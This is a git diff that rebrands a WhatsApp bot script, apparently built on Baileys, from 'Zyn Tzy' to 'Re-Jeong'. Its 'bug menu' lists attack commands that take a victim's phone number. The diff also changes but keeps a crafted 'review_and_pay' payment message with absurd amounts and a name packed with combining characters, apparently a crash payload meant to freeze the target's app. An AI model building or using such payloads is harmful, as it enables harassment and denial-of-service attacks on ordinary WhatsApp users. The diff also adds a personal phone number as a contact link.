@@ -92,7 +92,7 @@ let run = runtime(process.uptime())
 
 // Command Yang Muncul Di Console
 if (isCmd) {
-console.log(chalk.white.bgRed.bold('Ada Pesan, Om'), color(`[ 𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇 ]`, `green`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
+console.log(chalk.white.bgRed.bold('Ada Pesan, Om'), color(`[ Re-Jeong  𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇 ]`, `green`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
 }
 
         // Days
@@ -103,25 +103,25 @@ console.log(chalk.white.bgRed.bold('Ada Pesan, Om'), color(`[ 𝙎𝙖𝙣𝙕 �
 
         const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
         if (time2 < "23:59:00") {
-            var ucapanWaktu = 'Selamat Malam 🏙️'
+            var ucapanWaktu = 'Good night 🏙️'
         }
         if (time2 < "19:00:00") {
-            var ucapanWaktu = 'Selamat Petang 🌆'
+            var ucapanWaktu = 'Good evening 🌆'
         }
         if (time2 < "18:00:00") {
-            var ucapanWaktu = 'Selamat Sore 🌇'
+            var ucapanWaktu = 'Good evening 🌇'
         }
         if (time2 < "15:00:00") {
-            var ucapanWaktu = 'Selamat Siang 🌤️'
+            var ucapanWaktu = 'Good afternoon 🌤️'
         }
         if (time2 < "10:00:00") {
-            var ucapanWaktu = 'Selamat Pagi 🌄'
+            var ucapanWaktu = 'Good morning 🌄'
         }
         if (time2 < "05:00:00") {
-            var ucapanWaktu = 'Selamat Subuh 🌆'
+            var ucapanWaktu = 'Good morning 🌆'
         }
         if (time2 < "03:00:00") {
-            var ucapanWaktu = 'Selamat Tengah Malam 🌃'
+            var ucapanWaktu = 'Good morning 🌃'
         }
        
     zyn.autoshalat = zyn.autoshalat ? zyn.autoshalat : {}
@@ -212,7 +212,7 @@ const isOwner = ownerNumber.includes(senderNumber) || isBot
   }, contextInfo: {
       externalAdReply: {
       title: global.namabot,
-      body: `By Zyn Tzy`,
+      body: `By Re-Jeong`,
       thumbnailUrl: global.imageurl,
       sourceUrl: global.isLink,
       mediaType: 1,
@@ -362,7 +362,7 @@ const wanted = {
 					"nativeFlowMessage": {
 						"buttons": [{
 							"name": "review_and_pay",
-							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰Re-Jeong 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
 						}]
 					}
 				}
@@ -385,7 +385,7 @@ const wanted = {
 					"nativeFlowMessage": {
 						"buttons": [{
 							"name": "review_and_pay",
-							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰Re-Jeong 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
 						}]
 					}
 				}
@@ -428,7 +428,7 @@ return '' + saldo.split('', saldo.length - 1).reverse().join('');
 try {
 ppuser = await zyn.profilePictureUrl(m.sender, 'image')
 } catch (err) {
-ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
+ppuser = 'https://telegra.ph/file/019207dd7bf306d343b7e.jpg'
 }
 
 // FUNCTION OBFUSCATOR 
@@ -466,13 +466,13 @@ if (!m.key.fromMe) return
 
 async function loading () {
 var baralod = [
-"𝐙𝐲",
-"𝐙𝐲𝐧",
-"𝐙𝐲𝐧𝐓", 
-"𝐙𝐲𝐧𝐓𝐳",
-"𝐙𝐲𝐧𝐓𝐳𝐲", 
+"R",
+"Re",
+"Re-J", 
+"Re-Jeong",
+"Re-Jeong V4", 
 ]
-let { key } = await zyn.sendMessage(from, {text: '𝐙'})
+let { key } = await zyn.sendMessage(from, {text: 'R'})
 
 for (let i = 0; i < baralod.length; i++) {
 await zyn.sendMessage(from, {text: baralod[i], edit: key });
@@ -515,7 +515,7 @@ const reply = (teks) => {
         "externalAdReply": {
             "showAdAttribution": true,
             "containsAutoReply": true,
-            "title": `𝐙𝐲𝐧𝐓𝐳𝐲`,
+            "title": `Re-Jeong`,
             "body": `${namabot}`,
             "previewType": "PHOTO",
             "thumbnailUrl": ``,
@@ -527,7 +527,7 @@ const reply = (teks) => {
 { quoted: m })
         }
 
-const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }}}}
+const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/019207dd7bf306d343b7e.jpg' }}}}
 function parseMention(text = '') {
 return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
 }
@@ -547,65 +547,48 @@ case 'menu': {
 await loading()
 darkphonk = fs.readFileSync('./database/yali.mp3')
 const version = require("baileys/package.json").version
-const menu = `┏─── ｢ \`𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇\` ｣ ──❐
-┃🀄 𝐍𝐚𝐦𝐞 : *${pushname}*
-┃🀄 𝐁𝐨𝐭 : ${namabot}
-┃🀄 𝐃𝐞𝐯 : ${namaCreator}
-┃🀄 𝐕𝐞𝐫𝐬𝐢 : ${versisc}
-┃🀄 𝐑𝐮𝐧 : *${run}*
-┗──────────────❐`
+const menu = `┏─── ｢ \` *Re-Jeong* \` ｣ ──❐
+# 𝐍𝐚𝐦𝐞 : *${pushname}*
+# 𝐁𝐨𝐭 : Re-Jeong-V4
+*Revenge and royalty is ours💀we bought the future...👾🤖*`
 let sections = [{
-title: '⿻  ⌜ 𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇 ⌟  ⿻',
+title: '⿻  ⌜ Re-Jeong  ⌟  ⿻',
 highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
 rows: [{
-title: '👾 𝑨𝒍𝒍 𝑴𝒆𝒏𝒖 👾', 
+title: 'My commands', 
 id: '.allmenu'
 }]
 },
 {
 highlight_label: '𝐁𝐮𝐠 𝐌𝐞𝐧𝐮',
 rows: [{
-title: '👾 𝑨𝒕𝒕𝒂𝒄𝒌 𝑩𝒖𝒈 👾', 
+title: 'Bugs', 
 id: '.bugmenu'
-}]
-},
-{
-highlight_label: '𝐒𝐭𝐨𝐫𝐞 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑺𝒕𝒐𝒓𝒆 𝑴𝒆𝒏𝒖 👾', 
-id: '.storemenu'
-}]
-},
-{
-highlight_label: '𝐏𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑷𝒂𝒏𝒆𝒍 𝑴𝒆𝒏𝒖 👾', 
-id: '.panelmenu'
 }]
 },
 {
 highlight_label: '𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮',
 rows: [{
-title: '👾 𝑻𝒐𝒐𝒍𝒔 𝑴𝒆𝒏𝒖 👾', 
+title: 'Tools', 
 id: '.toolsmenu'
 }]
 },
 {
 highlight_label: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
 rows: [{
-title: '👾 𝑮𝒓𝒐𝒖𝒑 𝑴𝒆𝒏𝒖 👾', 
+title: 'Groups', 
 id: '.groupmenu'
 }]
 },
 {
 highlight_label: '𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮',
 rows: [{
-title: '👾 𝑶𝒘𝒏𝒆𝒓 𝑴𝒆𝒏𝒖 👾', 
-id: '.ownermenu'
+title: 'rjngmenu', 
+id: '.rjngmenu'
 }]
 }]
 let listMessage = {
-    title: '𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇', 
+    title: 'Re-Jeong', 
     sections
 };
 
@@ -635,7 +618,7 @@ buttons: [{
 },
  {
  "name": "cta_url",
- "buttonParamsJson": "{\"display_text\":\"My Creator\",\"url\":\"https://whatsapp.com/channel/0029VahNvB6IyPtUAQ4qSl32\",\"merchant_url\":\"https://whatsapp.com/channel/0029VahNvB6IyPtUAQ4qSl32\"}"
+ "buttonParamsJson": "{\"display_text\":\"Lord Re-Jeong\",\"url\":\"https://wa.me/27623649420\",\"merchant_url\":\"https://wa.me/27623649420\"}"
 }]
 }) 
 })} 
@@ -647,193 +630,55 @@ await zyn.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true
 }
 break
 
-case 'panelmenu': {
-await loading()
-const version = require("baileys/package.json").version
-const panelmenu = `┏─── ｢ \`𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇\` ｣ ──❐
-┃🀄 𝐍𝐚𝐦𝐞 : *${pushname}*
-┃🀄 𝐁𝐨𝐭 : ${namabot}
-┃🀄 𝐃𝐞𝐯 : ${namaCreator}
-┃🀄 𝐕𝐞𝐫𝐬𝐢 : ${versisc}
-┃🀄 𝐑𝐮𝐧 : *${run}*
-┗──────────────❐​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
-┏─『 \`𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔\` 』
-│ ᯤ 1ɢʙ
-│ ᯤ 2ɢʙ
-│ ᯤ 3ɢʙ
-│ ᯤ 4ɢʙ
-│ ᯤ 5ɢʙ
-│ ᯤ 6ɢʙ
-│ ᯤ 7ɢʙ
-│ ᯤ 8ɢʙ
-│ ᯤ 9ɢʙ
-│ ᯤ ᴜɴʟɪ
-│ ᯤ ʟɪsᴛsʀᴠ
-│ ᯤ ᴅᴇʟsʀᴠ
-┗─────────────❐`
-let sections = [{
-title: '⿻  ⌜ 𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇 ⌟  ⿻',
-highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑨𝒍𝒍 𝑴𝒆𝒏𝒖 👾', 
-id: '.allmenu'
-}]
-},
-{
-highlight_label: '𝐁𝐮𝐠 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑨𝒕𝒕𝒂𝒄𝒌 𝑩𝒖𝒈 👾', 
-id: '.bugmenu'
-}]
-},
-{
-highlight_label: '𝐒𝐭𝐨𝐫𝐞 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑺𝒕𝒐𝒓𝒆 𝑴𝒆𝒏𝒖 👾', 
-id: '.storemenu'
-}]
-},
-{
-highlight_label: '𝐏𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑷𝒂𝒏𝒆𝒍 𝑴𝒆𝒏𝒖 👾', 
-id: '.panelmenu'
-}]
-},
-{
-highlight_label: '𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑻𝒐𝒐𝒍𝒔 𝑴𝒆𝒏𝒖 👾', 
-id: '.toolsmenu'
-}]
-},
-{
-highlight_label: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑮𝒓𝒐𝒖𝒑 𝑴𝒆𝒏𝒖 👾', 
-id: '.groupmenu'
-}]
-},
-{
-highlight_label: '𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑶𝒘𝒏𝒆𝒓 𝑴𝒆𝒏𝒖 👾', 
-id: '.ownermenu'
-}]
-}]
-let listMessage = {
-    title: '𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇', 
-    sections
-};
-
-let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
-"messageContextInfo": { 
-"deviceListMetadata": {}, 
-"deviceListMetadataVersion": 2
-}, 
-interactiveMessage: proto.Message.InteractiveMessage.create({
-contextInfo: { 
-mentionedJid: [m.sender], 
-externalAdReply: {
-showAdAttribution: true }
-}, body: proto.Message.InteractiveMessage.Body.create({ 
-text: panelmenu
-}), 
-footer: proto.Message.InteractiveMessage.Footer.create({ 
-text: ''
-}), 
-header: proto.Message.InteractiveMessage.Header.create({ 
-hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: zyn.waUploadToServer })) 
-}), 
-nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
-buttons: [{
-"name": "single_select",
-"buttonParamsJson": JSON.stringify(listMessage) 
-},
- {
- "name": "cta_url",
- "buttonParamsJson": "{\"display_text\":\"My Creator\",\"url\":\"https://whatsapp.com/channel/0029VahNvB6IyPtUAQ4qSl32\",\"merchant_url\":\"https://whatsapp.com/channel/0029VahNvB6IyPtUAQ4qSl32\"}"
-}]
-}) 
-})} 
-}}, {userJid: m.sender, quoted: m}) 
-await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
-messageId: freesex.key.id 
-})
-}
-break
-
 case 'bugmenu': {
 await loading()
 const version = require("baileys/package.json").version
-const bugmenu = `┏─── ｢ \`𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇\` ｣ ──❐
-┃🀄 𝐍𝐚𝐦𝐞 : *${pushname}*
-┃🀄 𝐁𝐨𝐭 : ${namabot}
-┃🀄 𝐃𝐞𝐯 : ${namaCreator}
-┃🀄 𝐕𝐞𝐫𝐬𝐢 : ${versisc}
-┃🀄 𝐑𝐮𝐧 : *${run}*
-┗──────────────❐​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
-┏─『 \`𝐂𝐎𝐎𝐔𝐒𝐄 𝐁𝐔𝐆\` 』
-│ ᯤ xᴢʏɴ <ɴᴜᴍʙᴇʀ>
-┗─────────────❐
-┏─『 \`𝐀𝐓𝐓𝐀𝐂𝐊 𝐁𝐔𝐆\` 』
-│ ᯤ ғᴜᴄᴋ <ɴᴜᴍʙᴇʀ>
-│ ᯤ sᴛᴜᴋ <ɴᴜᴍʙᴇʀ>
-│ ᯤ ᴛᴢʏ <ɴᴜᴍʙᴇʀ>
-│ ᯤ ғʟᴏᴡ <ɴᴜᴍʙᴇʀ>
-┗─────────────❐`
+const bugmenu = `
+*Revenge and royalty is ours💀we bought the future...👾🤖*
+1).gay
+2).stuk
+3).chinese-kill
+4).fuck
+5).rejeong-bug
+My name is Re-Jeong`
 let sections = [{
-title: '⿻  ⌜ 𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇 ⌟  ⿻',
+title: '⿻  ⌜ Re-Jeong ⌟  ⿻',
 highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
 rows: [{
-title: '👾 𝑨𝒍𝒍 𝑴𝒆𝒏𝒖 👾', 
+title: 'My commands', 
 id: '.allmenu'
 }]
 },
 {
 highlight_label: '𝐁𝐮𝐠 𝐌𝐞𝐧𝐮',
 rows: [{
-title: '👾 𝑨𝒕𝒕𝒂𝒄𝒌 𝑩𝒖𝒈 👾', 
+title: 'Bugs', 
 id: '.bugmenu'
-}]
-},
-{
-highlight_label: '𝐒𝐭𝐨𝐫𝐞 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑺𝒕𝒐𝒓𝒆 𝑴𝒆𝒏𝒖 👾', 
-id: '.storemenu'
-}]
-},
-{
-highlight_label: '𝐏𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑷𝒂𝒏𝒆𝒍 𝑴𝒆𝒏𝒖 👾', 
-id: '.panelmenu'
 }]
 },
 {
 highlight_label: '𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮',
 rows: [{
-title: '👾 𝑻𝒐𝒐𝒍𝒔 𝑴𝒆𝒏𝒖 👾', 
+title: 'tools', 
 id: '.toolsmenu'
 }]
 },
 {
 highlight_label: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
 rows: [{
-title: '👾 𝑮𝒓𝒐𝒖𝒑 𝑴𝒆𝒏𝒖 👾', 
+title: 'groups', 
 id: '.groupmenu'
 }]
 },
 {
 highlight_label: '𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮',
 rows: [{
-title: '👾 𝑶𝒘𝒏𝒆𝒓 𝑴𝒆𝒏𝒖 👾', 
-id: '.ownermenu'
+title: 'rjngmenu', 
+id: '.rjngmenu'
 }]
 }]
 let listMessage = {
-    title: '𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇', 
+    title: 'Re-Reong', 
     sections
 };
 
@@ -863,7 +708,7 @@ buttons: [{
 },
  {
  "name": "cta_url",
- "buttonParamsJson": "{\"display_text\":\"My Creator\",\"url\":\"https://whatsapp.com/channel/0029VahNvB6IyPtUAQ4qSl32\",\"merchant_url\":\"https://whatsapp.com/channel/0029VahNvB6IyPtUAQ4qSl32\"}"
+ "buttonParamsJson": "{\"display_text\":\"Lord Re-Jeong\",\"url\":\"https://wa.me/27623649420\",\"merchant_url\":\"https://wa.me/27623649420\"}"
 }]
 }) 
 })} 
@@ -874,224 +719,58 @@ messageId: freesex.key.id
 }
 break
 
-case 'storemenu': {
-await loading()
-const version = require("baileys/package.json").version
-const storemenu = `┏─── ｢ \`𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇\` ｣ ──❐
-┃🀄 𝐍𝐚𝐦𝐞 : *${pushname}*
-┃🀄 𝐁𝐨𝐭 : ${namabot}
-┃🀄 𝐃𝐞𝐯 : ${namaCreator}
-┃🀄 𝐕𝐞𝐫𝐬𝐢 : ${versisc}
-┃🀄 𝐑𝐮𝐧 : *${run}*
-┗──────────────❐​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
-┏─『 \`𝐒𝐓𝐎𝐑𝐄 𝐌𝐄𝐍𝐔\` 』
-│ ᯤ ᴘᴀʏᴍᴇɴᴛ 
-│ ᯤ ᴅᴀɴᴀᴍᴀsᴜᴋ
-│ ᯤ ᴘʀᴏsᴇs
-│ ᯤ ᴅᴏɴᴇ
-│ ᯤ ᴊᴘᴍᴘʀᴏᴍᴏsɪ 
-│ ᯤ ᴊᴘᴍ3
-┗─────────────❐`
-let sections = [{
-title: '⿻  ⌜ 𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇 ⌟  ⿻',
-highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑨𝒍𝒍 𝑴𝒆𝒏𝒖 👾', 
-id: '.allmenu'
-}]
-},
-{
-highlight_label: '𝐁𝐮𝐠 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑨𝒕𝒕𝒂𝒄𝒌 𝑩𝒖𝒈 👾', 
-id: '.bugmenu'
-}]
-},
-{
-highlight_label: '𝐒𝐭𝐨𝐫𝐞 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑺𝒕𝒐𝒓𝒆 𝑴𝒆𝒏𝒖 👾', 
-id: '.storemenu'
-}]
-},
-{
-highlight_label: '𝐏𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑷𝒂𝒏𝒆𝒍 𝑴𝒆𝒏𝒖 👾', 
-id: '.panelmenu'
-}]
-},
-{
-highlight_label: '𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑻𝒐𝒐𝒍𝒔 𝑴𝒆𝒏𝒖 👾', 
-id: '.toolsmenu'
-}]
-},
-{
-highlight_label: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑮𝒓𝒐𝒖𝒑 𝑴𝒆𝒏𝒖 👾', 
-id: '.groupmenu'
-}]
-},
-{
-highlight_label: '𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑶𝒘𝒏𝒆𝒓 𝑴𝒆𝒏𝒖 👾', 
-id: '.ownermenu'
-}]
-}]
-let listMessage = {
-    title: '𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇', 
-    sections
-};
 
-let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
-"messageContextInfo": { 
-"deviceListMetadata": {}, 
-"deviceListMetadataVersion": 2
-}, 
-interactiveMessage: proto.Message.InteractiveMessage.create({
-contextInfo: { 
-mentionedJid: [m.sender], 
-externalAdReply: {
-showAdAttribution: true }
-}, body: proto.Message.InteractiveMessage.Body.create({ 
-text: storemenu
-}), 
-footer: proto.Message.InteractiveMessage.Footer.create({ 
-text: ''
-}), 
-header: proto.Message.InteractiveMessage.Header.create({ 
-hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: zyn.waUploadToServer })) 
-}), 
-nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
-buttons: [{
-"name": "single_select",
-"buttonParamsJson": JSON.stringify(listMessage) 
-},
- {
- "name": "cta_url",
- "buttonParamsJson": "{\"display_text\":\"My Creator\",\"url\":\"https://whatsapp.com/channel/0029VahNvB6IyPtUAQ4qSl32\",\"merchant_url\":\"https://whatsapp.com/channel/0029VahNvB6IyPtUAQ4qSl32\"}"
-}]
-}) 
-})} 
-}}, {userJid: m.sender, quoted: m}) 
-await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
-messageId: freesex.key.id 
-})
-}
-break
 
 case 'allmenu': {
 await loading()
 const version = require("baileys/package.json").version
-const allmenu = `┏─── ｢ \`𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇\` ｣ ──❐
-┃🀄 𝐍𝐚𝐦𝐞 : *${pushname}*
-┃🀄 𝐁𝐨𝐭 : ${namabot}
-┃🀄 𝐃𝐞𝐯 : ${namaCreator}
-┃🀄 𝐕𝐞𝐫𝐬𝐢 : ${versisc}
-┃🀄 𝐑𝐮𝐧 : *${run}*
-┗──────────────❐
-┏─『 \`𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔\` 』
-│ ᯤ ᴀᴅᴅᴏᴡɴᴇʀ
-│ ᯤ ᴀᴅᴅᴘʀᴇᴍ
-│ ᯤ ᴅᴇʟᴏᴡɴᴇʀ
-│ ᯤ ᴅᴇʟᴘʀᴇᴍ
-│ ᯤ ᴘᴜʙʟɪᴄ
-│ ᯤ sᴇʟғ
-┗─────────────❐
-
-┏─『 \`𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔\` 』
-│ ᯤ ᴇɴᴄ <ᴄᴏᴅᴇ>
-│ ᯤ ᴇɴᴄʀʏᴘᴛ <ᴄᴏᴅᴇ>
-│ ᯤ ᴀɪ <ᴛᴇᴋs>
-┗─────────────❐
-
-┏─『 \`𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔\` 』
-│ ᯤ ʜɪᴅᴇᴛᴀɢ <ǫᴜᴇʀʏ>
-│ ᯤ ᴛᴀɢᴀʟʟ <ǫᴜᴇʀʏ>
-│ ᯤ ᴋɪᴄᴋ <ᴛᴀɢ>
-│ ᯤ ᴘʀᴏᴍᴏᴛᴇ <ᴛᴀɢ>
-│ ᯤ ᴅᴇᴍᴏᴛᴇ <ᴛᴀɢ>
-┗─────────────❐
-
-┏─『 \`𝐒𝐓𝐎𝐑𝐄 𝐌𝐄𝐍𝐔\` 』
-│ ᯤ ᴘᴀʏᴍᴇɴᴛ 
-│ ᯤ ᴅᴀɴᴀᴍᴀsᴜᴋ
-│ ᯤ ᴘʀᴏsᴇs
-│ ᯤ ᴅᴏɴᴇ
-│ ᯤ ᴊᴘᴍᴘʀᴏᴍᴏsɪ 
-│ ᯤ ᴊᴘᴍ3
-┗─────────────❐
-
-┏─『 \`𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔\` 』
-│ ᯤ 1ɢʙ
-│ ᯤ 2ɢʙ
-│ ᯤ 3ɢʙ
-│ ᯤ 4ɢʙ
-│ ᯤ 5ɢʙ
-│ ᯤ 6ɢʙ
-│ ᯤ 7ɢʙ
-│ ᯤ 8ɢʙ
-│ ᯤ 9ɢʙ
